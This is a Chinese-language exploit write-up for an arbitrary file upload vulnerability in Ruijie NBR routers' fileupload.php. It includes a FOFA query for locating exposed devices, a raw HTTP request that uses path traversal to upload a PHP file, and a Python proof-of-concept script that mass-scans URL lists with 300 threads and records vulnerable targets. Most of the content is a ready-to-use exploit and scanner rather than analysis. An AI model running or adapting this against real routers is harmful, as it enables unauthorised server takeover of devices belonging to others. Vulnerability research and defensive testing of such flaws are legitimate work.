### 漏洞描述

锐捷 NBR 路由器 fileupload.php文件存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器获取服务器权限。

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719486257208-06fe7236-99b8-46fd-92ba-5120cf730c5f.png)

### fofa语法

```plain
app="Ruijie-NBR路由器"
```

### 漏洞复现

```plain
POST /ddi/server/fileupload.php?uploadDir=../../321&name=123.php HTTP/1.1
Host: 127.0.0.1
Accept: text/plain, */*; q=0.01
Content-Disposition: form-data; name="file"; filename="111.php"
Content-Type: image/jpeg

<?php phpinfo();?>
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719486322716-395afae7-91cc-4134-ad9f-24f3c814ed67.png)

访问拼接路径

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719486369736-c2ce9b63-62dd-4475-98b1-d68b01ba5f72.png)

### poc脚本

~~~markdown
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
	banner = """

██╗  ██╗ █████╗  ██████╗██╗  ██╗    ██████╗ ██╗   ██╗    ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ 
██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗╚██╗ ██╔╝    ████╗ ████║██╔══██╗╚══███╔╝██║  ██║██╔══██╗
███████║███████║██║     █████╔╝     ██████╔╝ ╚████╔╝     ██╔████╔██║███████║  ███╔╝ ███████║███████║
██╔══██║██╔══██║██║     ██╔═██╗     ██╔══██╗  ╚██╔╝      ██║╚██╔╝██║██╔══██║ ███╔╝  ██╔══██║██╔══██║
██║  ██║██║  ██║╚██████╗██║  ██╗    ██████╔╝   ██║       ██║ ╚═╝ ██║██║  ██║███████╗██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═════╝    ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝                      
                                       
                            version:1.1.0
                            author:mazha.top 
	"""
	print(banner)
def poc(target):
	payload_url = "/ddi/server/fileupload.php?uploadDir=../../321&name=123.php"
	url = target + payload_url
	headers={
		"Accept": "text/plain, */*; q=0.01",
		"Content-Disposition": 'form-data; name="file"; filename="111.php"',
		"Content-Type": "image/jpeg"
	}	
	data = "<?php phpinfo();?>"

	try:
		res = requests.get(url=target,verify=False)
		res1 = requests.post(url=url,headers=headers,data=data,verify=False)
		if res.status_code == 200:
			if res1.status_code == 200 and "result" in res1.text:
				print(f"{GREEN}[+]该url存在任意文件上传漏洞：{target}\n{RESET}")
				with open("result.txt","a",encoding="utf-8") as f:
					f.write(target+"\n")
			else:
				print(f"[-]该url不存在任意文件上传漏洞")
		else:
			print(f"该url连接失败")
	except:
		print(f"[*]该url出现错误")

def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
	args = parser.parse_args()
	if args.url and not args.file:
		poc(args.url)
	elif args.file and not args.url:
		url_list = []
		with open(args.file,"r",encoding="utf-8") as f:
			for i in f.readlines():
				url_list.append(i.strip().replace("\n",""))
		mp = Pool(300)
		mp.map(poc,url_list)
		mp.close()
		mp.join()
	else:
		print(f"\n\tUage:python {sys.argv[0]} -h")


if __name__ == "__main__":
	main()
~~~

### py脚本使用

```
python3 文件名 -f url.txt # 批量测试url
python3 文件名 -u http://127.0.0.1 # 单个测试url
```

